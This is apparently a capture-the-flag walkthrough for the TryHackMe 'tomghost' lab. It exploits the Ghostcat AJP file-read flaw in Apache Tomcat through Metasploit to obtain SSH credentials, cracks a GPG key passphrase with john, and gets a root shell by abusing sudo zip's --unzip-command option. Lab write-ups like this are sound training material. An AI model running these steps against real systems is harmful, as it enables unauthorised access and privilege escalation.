## Title: tomghost
### https://tryhackme.com/room/tomghost
### IP: 10.10.50.24

#### Answer the questions below:

#### Compromise this machine and obtain user.txt
Answer format: ***{********************************}

#### Escalate privileges and obtain root.txt
Answer format: ***{********************************}

#### Nmap:

22: SSH

53: tcpwrapped

8009: ajp13 - Apache Jserv

8080: http - Apache Tomcat 9.0.30

Navigating to 10.10.50:8080 is just the default Apache Tomcat page.

#### Using dirb to recursively scan and locate any interesting directories or files:

dirb http://10.10.50.24 -R

#### Found directories:

http://10.10.50.24:8080/docs

http://10.10.50.24:8080/examples

http://10.10.50.24:8080/host-manager

http://10.10.50.24:8080/manager

Nothing too interesting in these.

#### Checking exploitDB for AJP vulns:

AJP 'Ghostcat' File Read/Inclusion (Also in Metasploit)

#### Using Metasploit:

msfconsole

search AJP

use 0

info

#### Options:

AJP_PORT: 8009

FILENAME: /WEB-INF/web.xml

RHOSTS: 10.10.50.24 (Target host)

RPORT: 8080 (Apache Tomcat webserver port

SSL: false

#### Loot gathered:

skyfuck:8730281lkjlkjdqlksalks

Most likely SSH creds, trying them gets us access to skyfuck@ubuntu

#### Some quick enumeration:

ls: credential.pgp and tryhackme.asc

tryhackme.asc is the private key used to decrypt credential.pgp.

Running sudo -l and we don't have admin.

For now lets look for the user flag.

cd ..

ls: merlin & skyfuck

cd merlin

cat user.txt

#### Back to the other files. Lets copy them across with scp:

scp -p skyfuck@10.10.50.24:/home/skyfuck/tryhackme.asc tryhackme.asc

scp -p skyfuck@10.10.50.24:/home/skyfuck/credential.pgp credential.pgp

#### Using gpg2john we can turn the .asc file into a hash that john can attempt to crack:

gpg2john tryhackme.asc > tryhackme.txt

#### We can then attempt to crack this hash using john with a wordlist such as rockyou:

john -wordlist=/usr/share/wordlists/rockyou.txt.gz tryhackmeHash.txt

#### This gives us the passphrase alexandru, with this we can import the gpg key with:

gpg --import tryhackme.asc

#### And then decrypt the the credential.pgp file which gives us merlin's creds:

marlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

#### After SSHing in with these creds:

sudo -l: We can see that merlin is able to run /usr/bin/zip as root.

#### After some research I found the following article, showing how to pass commands through Zip:

https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/

#### Using the following commands we can spawn a shell as root:

touch text.txt

sudo zip 1.zip text.txt -T --unzip-command="sh -c /bin/bash"

#### Now we just look for the root flag:

cd root

cat root.txt
